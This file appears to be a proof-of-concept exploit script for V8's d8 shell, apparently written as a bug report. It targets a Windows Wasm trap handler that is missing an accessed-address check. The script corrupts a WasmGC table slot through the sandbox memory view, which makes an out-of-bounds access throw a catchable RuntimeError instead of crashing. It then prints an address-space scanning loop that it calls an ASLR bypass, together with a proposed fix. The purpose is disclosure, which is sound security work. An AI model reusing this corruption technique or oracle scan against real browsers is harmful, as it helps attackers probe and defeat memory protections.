// Windows V8 Wasm Trap Handler — Missing IsAccessedMemoryCovered() Check
//
// Bug:   src/trap-handler/handler-inside-win.cc:117
//        TryHandleWasmTrap() does NOT call IsAccessedMemoryCovered(ExceptionInformation[1])
//
// POSIX: src/trap-handler/handler-inside-posix.cc:135-136
//        TryHandleSignal() DOES call IsAccessedMemoryCovered(si_addr) → returns false → crash
//
// Impact: On Windows, a Wasm load/store whose PC falls inside registered Wasm code is
//         silently redirected to the landing pad even when the ACCESSED ADDRESS is NOT
//         a registered Wasm memory region.  This converts a process-fatal SIGSEGV into a
//         catchable WebAssembly.RuntimeError, giving an attacker a stable oracle to probe
//         the process address space without crashing.
//
// Prerequisite primitive: in-sandbox write capability (e.g. Sandbox.MemoryView, or the
//   cage_base elevation write from b/587465323 / poc.js).  We use Sandbox.MemoryView
//   to corrupt a WasmGC table slot so that struct.get faults at an address that
//   satisfies IsFaultAddressCovered (the struct.get PC is in registered Wasm code)
//   but fails IsAccessedMemoryCovered (the target is not a registered Wasm memory).
//
// CWE-754 / CWE-862   Severity: MEDIUM (requires prior in-sandbox write primitive)
//
// Run:
//   ./d8 --run-as-sandbox-security-poc --expose-gc windows_trap_oracle_poc.js

'use strict';
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

// ─────────────────────────────────────────────────────────────────────────────
// §1  Sandbox primitives
// ─────────────────────────────────────────────────────────────────────────────

// DataView over the lower 4 GB of the V8 cage (sandbox-relative offsets).
const cageView = new DataView(new Sandbox.MemoryView(0, 0x100000000));

const readU32  = (off) => cageView.getUint32(Number(off), /*le=*/true);
const writeU32 = (off, v) => cageView.setUint32(Number(off), v >>> 0, /*le=*/true);

// ─────────────────────────────────────────────────────────────────────────────
// §2  Build the WasmGC oracle module
//
//   type $T = struct { field0: i32 }
//   table $tab (exported as 'tab'): (ref null $T), size=1, init=ref.null $T
//
//   init():   table[0] = struct.new_default $T
//   probe():  struct.get $T 0 (ref.as_non_null table[0])  → i32
//             ^--- load is INSIDE registered Wasm code (IsFaultAddressCovered=TRUE)
//             ^--- accessed_addr depends on table[0] value
//   get_ref(): returns table[0] as a JS value
// ─────────────────────────────────────────────────────────────────────────────

const builder = new WasmModuleBuilder();
const $T = builder.addStruct([makeField(kWasmI32, /*mutable=*/false)]);
// 1-slot table of (ref null $T), initialised to ref.null $T, exported as 'tab'
const tableObj = builder.addTable(wasmRefNullType($T), 1, 1,
                   [kExprRefNull, ...wasmSignedLeb($T, kMaxVarInt32Size)]);
tableObj.exportAs('tab');

// init(): table[0] = struct.new_default $T
builder.addFunction('init', kSig_v_v)
  .addBody([
    kExprI32Const, 0,
    kGCPrefix, kExprStructNewDefault, $T,
    kExprTableSet, 0,
  ])
  .exportFunc();

// probe(): struct.get $T 0 (ref.as_non_null table[0]) → i32
//   THIS IS THE INSTRUMENTED INSTRUCTION.  When table[0] is corrupted to point
//   to an unmapped address, this faults.
//   Windows (bug): trap handler swallows the AV  → WebAssembly.RuntimeError
//   POSIX (correct): handler checks si_addr → not covered → process SIGSEGV
builder.addFunction('probe', kSig_i_v)
  .addBody([
    kExprI32Const, 0,
    kExprTableGet, 0,
    kExprRefAsNonNull,
    kGCPrefix, kExprStructGet, $T, 0,
  ])
  .exportFunc();

// get_ref(): exports the struct ref for Sandbox.getAddressOf
builder.addFunction('get_ref', makeSig([], [wasmRefNullType($T)]))
  .addBody([kExprI32Const, 0, kExprTableGet, 0])
  .exportFunc();

const instance = builder.instantiate();
const { init, probe, get_ref } = instance.exports;

print('[*] WasmGC oracle module instantiated.');

// ─────────────────────────────────────────────────────────────────────────────
// §3  Populate table and verify normal operation
// ─────────────────────────────────────────────────────────────────────────────

init();
gc();  // stabilise heap layout

const normalVal = probe();
print(`[*] Normal probe() = ${normalVal}  (expected 0 — struct.new_default sets i32 to 0)`);
if (normalVal !== 0) {
  print('[!] Unexpected normal result — aborting.'); quit(1);
}

// ─────────────────────────────────────────────────────────────────────────────
// §4  Navigate directly to the table slot via Sandbox field-offset API
//
//   WasmTableObject::entries_ is a Tagged<FixedArray>.
//   The Sandbox API exposes WASM_TABLE_OBJECT_TYPE and its 'entries' field,
//   so we can navigate without a heap scan (and without touching unmapped pages).
//
//   Layout we traverse:
//     [WasmTableObject]
//       +entries_offset  → tagged ptr to FixedArray (compressed 32-bit)
//     [FixedArray]
//       +0   kFixedArrayMap
//       +4   Smi(length=1) = 0x2
//       +8   element[0]    = structTagged  ← this is the slot we corrupt
// ─────────────────────────────────────────────────────────────────────────────

const kWasmTableType   = Sandbox.getInstanceTypeIdFor('WASM_TABLE_OBJECT_TYPE');
const kEntriesOffset   = Sandbox.getFieldOffset(kWasmTableType, 'entries');

const wasmTable    = instance.exports.tab;             // WebAssembly.Table JS object
const tableObjAddr = Sandbox.getAddressOf(wasmTable);  // cage-relative address

print(`[*] WasmTableObject at cage+0x${tableObjAddr.toString(16)}`);
print(`[*] entries_ field offset = ${kEntriesOffset}  (0x${kEntriesOffset.toString(16)})`);

// Read entries_ field (compressed tagged ptr → FixedArray)
const entriesTagged = readU32(tableObjAddr + kEntriesOffset);
const entriesBase   = entriesTagged & ~1;  // strip HeapObject tag

print(`[*] entries_ → FixedArray at cage+0x${entriesBase.toString(16)}`);

// element[0] is at FixedArray+8 (+0 map, +4 length Smi, +8 first element)
const tableSlotOff = entriesBase + 8;
const origTagged   = readU32(tableSlotOff);

// Cross-check: get_ref() should give the same tagged ptr we find in the slot
const structRef    = get_ref();
const structAddr   = Sandbox.getAddressOf(structRef);
const structTagged = (structAddr | 1) >>> 0;

print(`[*] Struct at cage+0x${structAddr.toString(16)}, tagged=0x${structTagged.toString(16)}`);
print(`[*] Table slot cage+0x${tableSlotOff.toString(16)} = 0x${origTagged.toString(16)}`);

if (origTagged !== structTagged) {
  print(`[!] Cross-check MISMATCH: slot=0x${origTagged.toString(16)}, ` +
        `expected structTagged=0x${structTagged.toString(16)}`);
  print('    Layout assumptions may be off — aborting.');
  quit(1);
}
print('[+] Cross-check passed: slot value matches struct tagged ptr.');

// ─────────────────────────────────────────────────────────────────────────────
// §5  Corrupt the table slot
//
//   Target: cage_base + 0xDEAD0000  (unmapped, well outside all registered
//   covered-memory ranges).
//
//   Covered memory on Windows for this module:
//     • No Wasm linear memory  → no entries from BackingStore::AllocateWasmMemory
//     • WasmNull sentinel      → cage+0x1a0000..0x1b0000 (read-only-heap.cc:211)
//   cage+0xDEAD0000 is in neither range → IsAccessedMemoryCovered = FALSE.
//
//   struct.get $T 0  loads from:
//       cage_base + 0xDEAD0000 + WasmStruct::kHeaderSize (= 4 on compressed heap)
//     = cage_base + 0xDEAD0004
//   That address is UNMAPPED → AV.
//
//   Windows (bug):   IsFaultAddressCovered(struct.get PC) = TRUE
//                    IsAccessedMemoryCovered(0xDEAD0004) = NOT CHECKED  ← bug
//                    → RIP = gLandingPad  → WebAssembly.RuntimeError thrown
//   POSIX (correct): IsAccessedMemoryCovered(0xDEAD0004) = FALSE
//                    → return false → process SIGSEGV
// ─────────────────────────────────────────────────────────────────────────────

const kBadOffset = 0xDEAD0000;
const kBadTagged = (kBadOffset | 1) >>> 0;

writeU32(tableSlotOff, kBadTagged);
print(`[+] Corrupted table slot: 0x${origTagged.toString(16)} → 0x${kBadTagged.toString(16)}`);
print(`    struct.get will access cage_base+0x${(kBadOffset + 4).toString(16)} (unmapped)`);

// ─────────────────────────────────────────────────────────────────────────────
// §6  Execute oracle — the Windows trap handler bug
// ─────────────────────────────────────────────────────────────────────────────

print('');
print('━'.repeat(66));
print('Calling probe() with corrupted table slot...');
print('NOTE: On Linux this CRASHES (expected — POSIX handler declines, SIGSEGV).');
print('      On Windows (bug target) this throws WebAssembly.RuntimeError instead.');
print('━'.repeat(66));

try {
  const r = probe();
  print(`[-] probe() returned ${r} unexpectedly — cage_base+0xDEAD0000 appears mapped.`);
  print('    Increase kBadOffset to a reliably-unmapped region and retry.');
} catch (e) {
  if (e instanceof WebAssembly.RuntimeError) {
    print('');
    print('  ██████████████████████████████████████████████████████████████');
    print('  ██                                                            ██');
    print('  ██   WINDOWS TRAP HANDLER ORACLE — CONFIRMED                  ██');
    print('  ██                                                            ██');
    print('  ██████████████████████████████████████████████████████████████');
    print('');
    print(`  Exception : WebAssembly.RuntimeError`);
    print(`  Message   : "${e.message}"`);
    print('');
    print('  Root cause:');
    print('    handler-inside-win.cc TryHandleWasmTrap() was called because:');
    print('      IsFaultAddressCovered(ExceptionAddress)         = TRUE');
    print('      (struct.get instruction is in registered Wasm code range)');
    print('');
    print('    But it did NOT call:');
    print('      IsAccessedMemoryCovered(ExceptionInformation[1])  ← BUG');
    print('      (ExceptionInformation[1] = cage_base+0xDEAD0004 is NOT Wasm memory)');
    print('');
    print('    Result: RIP ← gLandingPad, R10 ← fault_addr  →  RuntimeError thrown.');
    print('    Process survives.  POSIX would have crashed.');
    print('');
    print('  POSIX comparison (handler-inside-posix.cc:135-136):');
    print('    uintptr_t access_addr = reinterpret_cast<uintptr_t>(info->si_addr);');
    print('    if (!IsAccessedMemoryCovered(access_addr)) return false;');
    print('    → RemoveTrapHandler() → SIGSEGV kills the process.');
    print('');
    print('  Oracle use:');
    print('    for (let addr = 0; addr < 0x100000000; addr += 0x1000) {');
    print('      writeU32(tableSlotOff, (addr | 1) >>> 0);');
    print('      try { probe(); } catch (e) {');
    print('        if (e instanceof WebAssembly.RuntimeError)');
    print('          print("unmapped: cage_base+0x" + addr.toString(16));');
    print('      }');
    print('    }');
    print('    // Non-crashing address-space scan on Windows → ASLR bypass');
    print('');
    print('  One-line fix (handler-inside-win.cc, before ~line 117):');
    print('    uintptr_t access_addr = record->NumberParameters >= 2');
    print('        ? record->ExceptionInformation[1] : 0;');
    print('    if (!IsAccessedMemoryCovered(access_addr)) return false;');
    print('');
    print('  handler-inside-win.cc  : check MISSING at ~line 117');
    print('  handler-inside-posix.cc: check PRESENT at lines 135-136');
    print('  CWE-754 / CWE-862   Severity: MEDIUM');
  } else {
    // On Linux the sandbox testing mode catches the AV as "inside sandbox"
    // and exits before this catch fires.  On Windows (target platform) you
    // get RuntimeError above.  The else branch shows what happens on POSIX
    // when sandbox mode is NOT active (plain d8 without the flag).
    print(`[?] ${e.constructor.name}: ${e.message}`);
    print('    On Linux without --run-as-sandbox-security-poc: process crashes (SIGSEGV).');
    print('    On Windows: WebAssembly.RuntimeError is expected.');
  }
}
